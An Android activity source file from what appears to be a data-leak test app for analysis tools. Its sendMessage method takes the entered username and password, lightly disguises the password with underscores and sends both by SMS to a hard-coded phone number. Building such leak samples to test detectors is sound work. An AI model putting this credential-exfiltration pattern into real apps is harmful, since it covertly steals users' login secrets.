package com.example.sampr.leakageapp;

import android.support.v7.app.AppCompatActivity;
import android.os.Bundle;
import android.telephony.SmsManager;
import android.view.Menu;
import android.view.MenuItem;
import android.view.View;
import android.widget.Button;
import android.widget.EditText;

public class MainActivity extends AppCompatActivity {
    private User user = null;
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
    }
    @Override
    protected void onRestart(){
        super.onRestart();
        EditText usernameText =
                (EditText)findViewById(R.id.username);
        EditText passwordText =
                (EditText)findViewById(R.id.pwdString);
        String uname = usernameText.toString();
        String pwd = passwordText.toString();
        if(!uname.isEmpty() && !pwd.isEmpty()){
            this.user = new User(uname, pwd);
        }
        Button sampritysButton = (Button)findViewById(R.id.login);
        sampritysButton.setOnClickListener(
                new Button.OnClickListener(){
                    public void onClick(View v){
                        sendMessage(v);
                    }
                }
        );
    }

    public void sendMessage(View view){

        String pwdString = user.getPwd();
        String obfPwd = "";
        //must track primitives
        for(char c : pwdString.toCharArray())
            obfPwd += c + "_";
        String message = "User: " +
                user.getUname() + " | PWD: " + obfPwd;
        SmsManager sms = SmsManager.getDefault();
        sms.sendTextMessage("+44 020 7321 0905",
                null, message, null, null);
    }
}
